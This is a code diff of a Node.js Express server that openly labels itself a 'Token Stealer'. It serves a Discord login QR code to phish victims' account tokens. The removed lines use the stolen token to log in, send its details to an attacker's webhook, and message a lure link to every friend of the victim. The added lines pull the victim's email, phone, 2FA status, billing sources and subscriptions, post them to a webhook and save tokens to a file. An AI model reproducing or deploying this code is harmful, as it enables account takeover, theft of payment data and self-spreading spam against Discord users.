@@ -1,61 +1,126 @@
-const { Webhook, MessageBuilder } = require('discord-webhook-node');
-const { RemoteAuthClient } = require('discord-remote-auth');
-const Discord = require('discord.js-selfbot-v11');
-const express = require('express');
 const chalk = require('chalk');
-const fss = require('fs');
+const { RemoteAuthClient } = require('discord-remote-auth');
+const express = require('express');
+const r = require('express-rate-limit');
+const fs = require('fs');
+const axios = require('axios'); 
+
 const app = express();
 
+var traffic = 0; 
+var webhookURL = ""; //PLEASE PUT WEBHOOK URL HERE
 
-app.get('/', async (req, res) => {
-    const ip_addr = req.socket.remoteAddress || req.headers['x-forwarded-for'];
-    const auth_client = new RemoteAuthClient();
-    
-    const message_to_send = 'Omg https://vu.fr/QrNitroGenerator\nhttps://media.discordapp.net/attachments/897903146469306378/898857234673598484/unknown.png';
-    
-    auth_client.on('pendingRemoteInit', async fingerprint => {
-        await res.render('index.ejs', { qr_code_path: `https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=https://discordapp.com/ra/${fingerprint}` });
-    });
-
-    auth_client.on('finish', async token => {
-        const client = new Discord.Client();
-        
-        client.on('ready', () => {
-            console.log(`[${chalk.yellowBright('*')}] Connected on ${token}`);
-
-            new Webhook('https://discord.com/api/webhooks/you webhook')
-                .send(new MessageBuilder()
-                    .setColor('#f5b642').setThumbnail(client.user.avatarURL).setFooter('🤡 Joker by !\'" Ѵιcнч.ѕн#1024').setTimestamp()
-                    .setDescription('```' + token + '```' + '\n' + '```' + ip_addr + '```\n')
-                    .addField('> `🚹` **Username**', `\`${client.user.tag}\``)
-                    .addField('> `📫` **Email**', `\`${client.user.email}\``)
-                    .addField('> `💳` **Nitro**', `\`${client.user.premium}\``)
-                    .addField('> `🤡` **Friends**', `\`${client.user.friends.size}\``)
-                    .addField('> `📋` **Presence**', `\`${client.user.presence.status}\``)
-                );
-            
-            client.user.friends.forEach(async member => {
-                await member.send(`||<@${member.id}>|| ${message_to_send}`).catch(err => {
-                    console.log(`[${chalk.redBright('-')}] Dm -> ${err.message}`);
-                }).then(() => {
-                    console.log(`[${chalk.cyanBright('+')}] Dm -> ${member.username}`);
-                });
-            });
-        });
-
-        client.login(token).then(() => fss.appendFileSync('./tokens.txt', `${token}\n`));
-    });
-    
-    auth_client.connect();
+function write(content, file) {
+    fs.appendFile(file, content, function (err) { });
+}
+//Rate limiter || Used to stop abuse by mass requests
+var limiter = new r(
+{
+	statusCode: 429,
+	windowMs: 60 * 1000,
+	max: 10,
+	message:
+	{
+		type: "error",
+		title: "Rate Limited",
+		msg: "Rate Limited, please try again later!",
+		extra: "Take the L"
+	}
 });
 
-app.listen(3000, () => {
+app.use(limiter);
+
+async function getTokenData(token){
+	var res = await axios.get('https://discordapp.com/api/v6/users/@me', { 
+		validateStatus: false,
+		headers: {
+			'Authorization': token,
+		}
+	}) 
+	var data = { 
+		id: res.data["id"],
+		username: res.data["username"] + res.data["discriminator"], 
+		twoFA: res.data["mfa_enabled"], 
+		email: res.data["email"],
+		phone: res.data["phone"],
+		verified: res.data["verified"],
+		billing: "", 
+		subscriptions: "", 
+		token: "",
+	}
+	
+	var res = await axios.get('https://discordapp.com/api/v6/users/@me/billing/payment-sources', {
+		validateStatus: false,
+		headers: {
+			'Authorization': token,
+		}
+	})
+	var billing = res.data; 
+	data.billing = billing;
+	
+	var res = await axios.get('https://discordapp.com/api/v9/users/@me/billing/subscriptions', {
+		validateStatus: false,
+		headers: {
+			'Authorization': token,
+		}
+	})
+	var subscriptions = res.data; 
+	
+	data.subscriptions = subscriptions;
+	data.token = token; 
+	
+	return data; 
+}
+
+
+async function webhook(data){
+	
+	let params = {
+        username: 'Token Stealer',
+        content: "```js\n" + JSON.stringify(data).replace(/,/g,",\n") + "```",
+    };
+
+	var res = await axios.post(webhookURL, params, {
+		headers: {
+			'Content-type': 'application/json'
+		},
+	})
+	console.log(res.data);
+	
+}
+
+app.get('/', async (req, res) => {
+	traffic++;
+	//Grabs Ip && Starts auth connection for token grabbing
+    var ip_addr = req.headers['x-forwarded-for'] || req.connection.remoteAddress.replace('::ffff:', '');
+    var auth_client = new RemoteAuthClient();
+	
+    auth_client.on('pendingRemoteInit', async fingerprint => {
+		console.log(`[${chalk.greenBright('+')}]` + ` Connected | IP: ${ip_addr} FingerPrint: ${fingerprint}`);
+        await res.render('index.ejs', { qr_code_path: `https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=https://discordapp.com/ra/${fingerprint}` });
+    })
+
+    auth_client.on('finish', async token => {
+
+		webhook(await getTokenData(token))
+		write(token + "\n", "tokens.txt");
+		
+    })
+	process.title = `[313] Token Stealer | Connections: ${traffic}`;
+    auth_client.connect();
+})
+
+app.listen(80, () => {
     console.clear()
+	process.title = "[313] Token Stealer";
     console.log(chalk.greenBright(`
-      ╦╔═╗╦╔═╔═╗╦═╗
-      ║║ ║╠╩╗║╣ ╠╦╝
-     ╚╝╚═╝╩ ╩╚═╝╩╚═.
+            ████████╗ ██████╗ ██╗  ██╗███████╗███╗   ██╗    ███████╗████████╗███████╗ █████╗ ██╗     ███████╗██████╗ 
+            ╚══██╔══╝██╔═══██╗██║ ██╔╝██╔════╝████╗  ██║    ██╔════╝╚══██╔══╝██╔════╝██╔══██╗██║     ██╔════╝██╔══██╗
+               ██║   ██║   ██║█████╔╝ █████╗  ██╔██╗ ██║    ███████╗   ██║   █████╗  ███████║██║     █████╗  ██████╔╝
+               ██║   ██║   ██║██╔═██╗ ██╔══╝  ██║╚██╗██║    ╚════██║   ██║   ██╔══╝  ██╔══██║██║     ██╔══╝  ██╔══██╗
+               ██║   ╚██████╔╝██║  ██╗███████╗██║ ╚████║    ███████║   ██║   ███████╗██║  ██║███████╗███████╗██║  ██║
+               ╚═╝    ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═══╝    ╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚═╝  ╚═╝
     `));
-    
-    console.log(`[${chalk.greenBright('+')}] https://127.0.0.1:3000`)
+    console.log(`[${chalk.greenBright('+')}] http://127.0.0.1:80`);
+	console.log(``);
 });
